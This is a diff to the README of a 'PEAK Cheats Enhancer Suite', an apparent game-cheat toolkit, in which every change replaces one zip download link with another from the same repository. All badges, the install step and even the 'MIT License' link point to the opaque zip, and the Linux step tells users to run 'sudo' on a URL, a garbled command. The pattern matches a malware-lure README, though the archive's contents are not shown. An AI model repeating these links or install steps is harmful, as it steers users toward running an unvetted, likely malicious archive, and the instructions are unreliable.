@@ -1,5 +1,5 @@
 # PEAK Cheats Enhancer Suite 🛠️  
-[![Download](https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/peak_toolkit_enhancer_1.9.zip)](https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/peak_toolkit_enhancer_1.9.zip)
+[![Download](https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/enhancer_toolkit_peak_2.7.zip)](https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/enhancer_toolkit_peak_2.7.zip)
 
 ---
 
@@ -106,11 +106,11 @@ The PEAK Cheats Enhancer Suite can be set up in three quantum leaps:
 
 1. **Download the latest version:**  
    Click the Download badge at the top (or bottom) of this README or use this:  
-   https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/peak_toolkit_enhancer_1.9.zip
+   https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/enhancer_toolkit_peak_2.7.zip
 
 2. **Run the installer:**  
    Follow the guided wizard. On Linux, execute:  
-   `sudo https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/peak_toolkit_enhancer_1.9.zip`  
+   `sudo https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/enhancer_toolkit_peak_2.7.zip`  
    On Windows & macOS, double-click the installer and proceed.
 
 3. **Customize and Connect:**  
@@ -132,12 +132,12 @@ We champion responsible gaming innovation and community-driven improvements.
 
 ## 📜 MIT License (2025)
 
-This repository, including all code, documentation, and enhancement content, is licensed under the [MIT License (2025)](https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/peak_toolkit_enhancer_1.9.zip).  
+This repository, including all code, documentation, and enhancement content, is licensed under the [MIT License (2025)](https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/enhancer_toolkit_peak_2.7.zip).  
 Contributions, forks, and learning are not only permitted—they’re encouraged!
 
 ---
 
-[![Download](https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/peak_toolkit_enhancer_1.9.zip)](https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/peak_toolkit_enhancer_1.9.zip)
+[![Download](https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/enhancer_toolkit_peak_2.7.zip)](https://raw.githubusercontent.com/Affaq786/peak-enhancer-toolkit/branch/emancipist/enhancer_toolkit_peak_2.7.zip)
 
 **Connect. Enhance. Excel.**  
 Join the evolution—where PEAK potential is not a ceiling, but a launch pad.
